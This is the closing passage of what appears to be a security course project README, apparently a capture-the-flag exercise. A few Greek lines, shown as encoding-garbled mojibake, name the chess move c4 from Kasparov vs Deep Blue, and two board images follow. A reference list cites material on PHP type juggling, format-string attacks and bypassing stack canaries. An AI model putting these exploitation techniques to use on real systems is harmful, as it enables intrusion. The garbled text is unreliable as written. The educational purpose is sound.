   ÎˆÏ„ÏƒÎ¹ Î· ÎºÎ¯Î½Î·ÏƒÎ· Ï€Î¿Ï… Î­Ï€ÏÎµÏ€Îµ Î½Î± Î²ÏÎ¿ÏÎ¼Îµ Î®Ï„Î±Î½ Î· ÎµÎºÎµÎ¯Î½Î· Ï€Î¿Ï… Î­ÎºÎ±Î½Îµ Ï„Î¿Î½ Kasparov Î½Î± Ï€Î±ÏÎ±Î¹Ï„Î·Î¸ÎµÎ¯ Î±Ï€ÏŒ Ï„Î·Î½ Ï€Î±ÏÏ„Î¯Î´Î± ÎºÎ±Î¹ Î½Î± Î´ÏÏƒÎµÎ¹ Ï„Î· Î½Î¯ÎºÎ· ÏƒÏ„Î¿Î½ Deep Blue.
   
   Î•Î½ Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Ï‰ Ï€ÏÏŒÎºÎµÎ¹Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ ÎºÎ¯Î½Î·ÏƒÎ· **c4**.
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/30-Kasparov_vs_Deep_Blue_Mov18.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/31-Kasparov_vs_Deep_Blue_Mov19.png)|
   |-|-|
   
   
   

   
   

## References

<h5><sup>[1]</sup>  https://www.robotstxt.org/robotstxt.html</h5>
<h5><sup>[2]</sup>  https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf#page=33</h5>
<h5><sup>[3]</sup>  https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016</h5>
<h5><sup>[4]</sup>  https://stackoverflow.com/questions/6916805/why-does-a-base64-encoded-string-have-an-sign-at-the-end</h5>
<h5><sup>[5]</sup>  https://owasp.org/www-community/attacks/Format_string_attack</h5>
<h5><sup>[6]</sup>  https://cs155.stanford.edu/papers/formatstring-1.2.pdf#page=11</h5>
<h5><sup>[7]</sup>  https://en.wikipedia.org/wiki/Stack_buffer_overflow#Protection_schemes</h5>
<h5><sup>[8]</sup>  https://www.cvedetails.com/vulnerability-list/vendor_id-72/product_id-960/version_id-219995/GNU-GCC-5.4.html</h5>
<h5><sup>[9]</sup>  https://ctf101.org/binary-exploitation/stack-canaries/#bruteforcing-a-stack-canary</h5>
<h5><sup>[10]</sup>  https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries</h5>
<h5><sup>[11]</sup>  https://www.usenix.org/legacy/publications/library/proceedings/sec98/full_papers/cowan/cowan.pdf</h5>
<h5><sup>[12]</sup>  http://staff.ustc.edu.cn/~bjhua/courses/security/2014/readings/stackguard-bypass.pdf</h5>
<h5><sup>[13]</sup>  https://uaf.io/exploitation/2015/09/29/Stack-CANARY-Overwrite-Primer.html</h5>
<h5><sup>[14]</sup>  https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf#page=6</h5>
<h5><sup>[15]</sup>  https://en.wikipedia.org/wiki/Deep_Blue_versus_Garry_Kasparov#Game_6_2</h5>
<h5><sup>[16]</sup>  https://books.google.gr/books?id=-YL8AAAAQBAJ&pg=PA32&lpg=PA32&dq=1.+e4+c6+2.+d4+d5+3.+Nc3+dxe4+4.+Nxe4+Nd7+5.+Ng5+Ngf6+6.+Bd3+e6+7.+N1f3+h6+8.+Nxe6+Qe7+9.+0-0+fxe6+10.+Bg6%2B+Kd8+11.+Bf4+b5+12.+a4+Bb7+13.+Re1+Nd5+14.+Bg3+Kc8+15.+axb5+cxb5+16.+Qd3+Bc6+17.+Bf5+exf5+18.+Rxe7+Bxe&source=bl&ots=MQO8obder2&sig=ACfU3U3sevdTFhYDV1QTXtZg22lmyNbRRw&hl=el&sa=X&ved=2ahUKEwjh2am88_npAhWxAGMBHckeBL8Q6AEwAHoECAoQAQ#v=onepage&q=1.%20e4%20c6%202.%20d4%20d5%203.%20Nc3%20dxe4%204.%20Nxe4%20Nd7%205.%20Ng5%20Ngf6%206.%20Bd3%20e6%207.%20N1f3%20h6%208.%20Nxe6%20Qe7%209.%200-0%20fxe6%2010.%20Bg6%2B%20Kd8%2011.%20Bf4%20b5%2012.%20a4%20Bb7%2013.%20Re1%20Nd5%2014.%20Bg3%20Kc8%2015.%20axb5%20cxb5%2016.%20Qd3%20Bc6%2017.%20Bf5%20exf5%2018.%20Rxe7%20Bxe&f=false</h5>
